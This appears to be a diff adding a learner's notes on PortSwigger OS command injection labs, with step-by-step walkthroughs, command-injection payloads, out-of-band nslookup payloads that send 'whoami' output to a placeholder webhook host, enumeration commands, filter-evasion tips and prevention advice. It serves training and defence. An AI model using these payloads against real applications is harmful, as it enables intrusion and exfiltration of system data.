@@ -1,0 +1,136 @@
+OS Injection - things ive learned in the process:
+
+
+
+# All OS Command injections labs (PortSwigger)
+  https://portswigger.net/web-security/all-labs#os-command-injection
+
+# Lab 1 (Basic OS injection)
+---------------------------------------------------------------
+= Enter product page
+= Catch 'check stock' request with burp
+= try to inject ```; whoami #``` to first HTTP
+  parameter (or second dosen`t matter)
+= url encoded it
+SUCCESS !
+
+
+# Lab 2 (Blind OS injection [with time delays])
+---------------------------------------------------------------
+= Enter report feedback page
+= Catch 'send feedback' request with burp
+= send to repeater
+= tried payload ```; whoami #``` each param individualy
+= no error (+ 200 OK response) on email parameter
+= change payload ```& sleep 10 #```
+= url encoded it
+SUCCESS !
+
+
+
+# Lab 3 (Basic OS injection [with file stream redirections])
+---------------------------------------------------------------
+= Enter report feedback page
+= Catch 'send feedback' request with burp
+= send to repeater
+= tried payload ```; whoami #``` each param individualy
+= no error (+ 200 OK response) on email parameter
+= change payload ```; whoami &> /var/www/images/out#```
+= url encoded it
+= no error (+ 200 OK response)
+= right click on any image
+  ---> open in a new tab
+  ---> found url ``` .../image?filename=29.jpg ```
+= change url to ``` .../image?filename=out ```
+= url encoded it
+SUCCESS !
+
+
+# Lab 4 + 5 
+
+PortSwigger collaborator is required so ill pass (burp pro)
+but the payload would look something like this :
+
+
+
+lab 4 payload:
+; nslookup http://<web_hook> # ==> plain text
+
+%3B%20nslookup%20http%3A%2F%2F%3Cweb_hook%3E%20%23
+==> url encoded
+
+
+
+lab 5 payload
+; nslookup http://<web_hook>/$(whoami) # ==> plain text
+
+%3B%20nslookup%20http%3A%2F%2F%3Cweb_hook%3E%2F%24%28whoami%29%20%23
+ ==> url encoded
+
+
+
+
+
+Usefull commands to enumerate the vulnerable machine:
+
+Linux:	 	|	Windows:
+----------------|----------------
+netstat 	|	netstat
+uname -a / -r	|	ver
+ifconfig	|	ipconfig /all
+ps aux		|	tasklist
+whoami		|	whoami or whoami /all
+		| 	(to see user privileges)
+
+
+Shell operator used in OS Injections:
+------------------------------------------
+
+Linux:	 	|	Windows:
+----------------|----------------
+&	 	|	&
+&&		|	&&
+|		|	|
+||		|	||
+;		|	
+0x0a or \n	| 	
+`cmd`		|
+$(cmd)		|
+#		|	:: or REM
+
+https://stackoverflow.com/questions/11269338/how-to-comment-out-add-comment-in-a-batch-cmd
+
+
+# Ping command is a good replacement for sleep (Linux) or timeout (windows)  commands to   check for blind os Injection since each echo  request takes 1 second
+
+# The next link will help with blind (with redirect OS Injection):
+  https://catonmat.net/ftp/bash-redirections-cheat-sheet.pdf
+
+# The equivalent of sleep command of Linux bash in windows is timeout 
+
+# Sleep command works with strings like m or s, E.g. sleep 5m
+
+Tips :
+--------
+# Don't forget to url encode the payload
+
+# Try multiple terminal operators (Incase of filtering)
+
+# Usage of a comment operator is good (to override rest of original command)
+
+
+
+Prevention :
+-------------
+# Dont use OS command excecution in your code
+
+# whitelist/blacklist characters
+
+# heavy sanitization / filteration functions on user input
+
+# WAF
+
+# validate user input via regex (by number, alphanumertic, etc...)
+
+NOTE : dont use user input (shell code) escaping
+       since it could very easily be bypassed.
